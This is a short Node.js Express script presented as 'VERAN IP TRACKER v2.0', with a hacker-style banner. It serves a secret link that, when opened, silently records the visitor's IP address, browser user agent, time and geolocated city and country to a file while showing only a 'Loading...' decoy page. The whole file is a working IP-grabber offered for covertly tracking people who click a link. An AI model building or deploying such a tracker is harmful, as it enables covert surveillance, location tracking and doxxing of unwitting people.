// ======================
//  VERAN IP TRACKER v2.0
// ======================
const express = require('express');
const fs = require('fs');
const geoip = require('geoip-lite');

const app = express();
const PORT = 8080;
const SECRET = "nemesis"; // Change this if needed

console.log(`
▓█████▄  ▒█████   ██▀███  ▄▄▄█████▓
▒██▀ ██▌▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒
░██   █▌▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░
░▓█▄   ▌▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░ 
░▒████▓ ░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░ 
 ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ▒ ░░   
 ░ ▒  ▒   ░ ▒ ▒░   ░▒ ░ ▒░    ░    
 ░ ░  ░ ░ ░ ░ ▒    ░░   ░    ░      
   ░        ░ ░     ░              
`);

console.log('[+] TRACKER ACTIVE');
console.log(`[+] Local: http://YOUR-IP:${PORT}/${SECRET}/any-id`);
console.log(`[+] View Data: cat ips.txt\n`);

app.get(`/${SECRET}/:id`, (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.ip.replace('::ffff:', '');
  const geo = geoip.lookup(ip);
  
  const log = {
    id: req.params.id,
    ip: ip,
    time: new Date().toLocaleString(),
    device: req.headers['user-agent'] || 'Unknown',
    location: geo ? `${geo.city}, ${geo.country}` : 'Unknown'
  };
  
  fs.appendFileSync('ips.txt', JSON.stringify(log) + '\n');
  console.log(`[+] ${log.time} - ${ip} (${log.location})`);
  res.send('Loading...');
});

app.listen(PORT);
